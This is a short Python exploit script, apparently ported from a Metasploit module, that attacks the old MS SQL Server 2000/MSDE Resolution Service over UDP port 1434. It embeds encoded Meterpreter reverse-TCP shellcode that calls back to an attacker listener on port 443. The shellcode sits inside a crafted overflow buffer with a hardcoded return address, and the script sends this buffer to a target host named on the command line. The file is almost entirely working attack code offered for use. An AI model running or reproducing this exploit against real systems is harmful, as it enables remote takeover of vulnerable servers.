#!/usr/bin/python

#python impl. of ms02_03_slammer.rb

import sys, socket

rhost = sys.argv[1] 				# Target IP address as command line argument
rport = int(sys.argv[2])			# Target Port as command line argument 1434


#msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=10.11.0.xxx LPORT=443 -b '\x00\x3a\x0a\x0d\x2f\x5c' -a x86 --platform windows -e x86/#shikata_ga_nai -f python
#Payload size: 204 bytes
#Final size of python file: 986 bytes

buf =  ""
buf += "\xbd\xa0\xaf\xfe\x9f\xda\xc4\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x2d\x31\x6a\x13\x83\xea\xfc\x03\x6a\xaf\x4d"
buf += "\x0b\x63\xc5\x7a\xb3\x74\xe0\x82\xc3\x7a\x72\x4c\xe7"
buf += "\x0e\x0f\x92\x9c\x6d\xd2\x92\xa3\x62\xa7\x34\x84\x7d"
buf += "\x5d\x31\xf0\xe7\xa0\xa8\xc8\xd7\x3b\x98\xea\x12\x36"
buf += "\xe0\x2e\x26\x88\x97\x58\x64\x6e\x61\x6f\x1e\x8d\xda"
buf += "\xe4\xae\x75\xdc\x13\x56\xfe\xc2\xba\x1c\x4f\xe7\x3d"
buf += "\xca\x4c\x3b\xa7\x85\x3e\x67\xcb\xf4\x41\x87\xc2\x2d"
buf += "\xd9\xc3\x66\xe2\xaa\x94\x64\x89\xdc\x08\xd8\x06\x74"
buf += "\x39\x7c\x7f\xd7\x5f\xe8\x4c\xe5\xf7\x9f\xc1\x3b\x57"
buf += "\x34\x40\x82\x15\xd4\x73\x22\x4c\x47\xdf\x99\x3c\x2b"
buf += "\x8c\x5e\x90\x22\xd5\x06\x97\xda\x12\xc4\xc0\x77\x45"
buf += "\x71\x09\xa8\x76\x57\xb0\xee\x21\x38\xc2\xc7\xa5\xae"
buf += "\x36\xe3\xc9\x89\x21\x9b\xc8\x6e\xcb\x08\x42\x73\x7e"
buf += "\xbf\x07\x24\x19\x06\xf0\xcf\x1a\xae\xaf\x7b\xe8\x1f"
buf += "\x03\xd4\xa2\xf9\x1a\x1a\x7c\xf9\xbb"


rand ="J)@d|I17r3C9cW^T]ph.hM.k~X~Qbt|}q2eaAw$1Xclc3LQezkPi6KE$=iUL-OXVydMHeqnpjW,jXh1XkbV&i4Le*p`G0k9iw7l&a^l<=4$gSiZu7]itL}mFBW!<d=9zjJ{*ACmbqm@UV7@D[#k~Z&-osO-yu;@PF]CjS;`Wfl&)A{m!B8-au!h6IOM1HLur``oVh?@mJ*t*rsEU5Ulf))g^fM%Sa>,YC[PPElsuaLhSSoa3xn#2guLBHd%DYx=U9e}-+%R-}Rzpb#fSdOnmoHmlksO<-J5I-k96^fWQ9;;R[t=g.kjgy7BP;u&Tv|IMM|U[iN~Cr=xW*jf8Lt!hSOt7mTB+aGS1mY=SsrXNmA;TWdXhzb{]eC1MWlHRQ'"
ret = "\x74\x87\xb4\x42" # Return address 0x42b48774 (Little Endian) MSSQL 2000 / MSDE <= SP2
nops = "\x90" * 6
#thead local storage address little endian
tls1="\xcc\xe0\xfd\x7f"
jump="\xeb\x08"
pad="J)@d|I17r3C9cW^T]ph.hM.k~X~Qbt|}q2eaAw$1Xclc3LQezkPi6KE$=iUL-OXVydMHeqnpjW,jXh1XkbV&i4Le*p`G0k9iwW"
a = "J)@d|I17r3C9cW^T]ph.hM.k~X~Qbt|}q2eaAw$1Xclc3LQezkPi6KE$=iUL-OXVydMHeqnpjW,jXh1XkbV&i4Le*p`G0k9i" + "%s%s%s%s%s%s%s" + pad

#build payload
payload = a % (ret,nops,jump,tls1,tls1,buf,rand)

exploit = "\x04" + payload +"\x68:888" #start exploit with \0x4 and terminate exploit with a colon and a number.

print "[+] exploit \n" + exploit

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP socket

try:
	print "\nSlammer exploit..."+ rhost + ":" + str(rport) + "!"
	s.sendto(exploit, (rhost, rport))
	print "\nExploit delivered! A11an was here"
	print "\nCheck your exploit/multi/handler job now....."
except:
	print "\nFML ...could not connect to " + rhost + ":" + str(rport) + "!!!!"

